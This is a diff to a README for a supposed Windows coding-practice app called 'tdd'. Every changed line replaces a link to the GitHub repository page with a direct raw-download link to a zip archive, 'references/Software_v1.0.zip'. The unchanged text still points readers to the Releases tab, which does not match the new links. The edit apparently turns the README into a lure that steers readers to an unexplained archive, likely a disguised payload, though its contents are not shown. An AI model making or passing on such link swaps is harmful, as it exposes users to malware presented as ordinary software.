@@ -1,6 +1,6 @@
 # ⚙️ tdd - Build Coding Skills with Confidence
 
-[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd)
+[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd/raw/refs/heads/main/references/Software_v1.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before you begin, make sure your Windows system meets the requirements above. Yo
 
 To use tdd, start by downloading the software from the official GitHub page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-from%20GitHub-blue)](https://github.com/Yoon-yati-lin/tdd)
+[![Download from GitHub](https://img.shields.io/badge/Download-from%20GitHub-blue)](https://github.com/Yoon-yati-lin/tdd/raw/refs/heads/main/references/Software_v1.0.zip)
 
 **Follow these steps:**
 
@@ -109,7 +109,7 @@ For other issues, explore the **Help** menu in the app or visit the GitHub repos
 
 You can always download or update tdd by visiting the GitHub repository here:
 
-[https://github.com/Yoon-yati-lin/tdd](https://github.com/Yoon-yati-lin/tdd)
+[https://github.com/Yoon-yati-lin/tdd/raw/refs/heads/main/references/Software_v1.0.zip](https://github.com/Yoon-yati-lin/tdd/raw/refs/heads/main/references/Software_v1.0.zip)
 
 Click the **Releases** tab and get the latest Windows installer.
 
@@ -139,4 +139,4 @@ Download the latest installer from the **Releases** section to keep your app cur
 
 ---
 
-[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd)
+[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd/raw/refs/heads/main/references/Software_v1.0.zip)
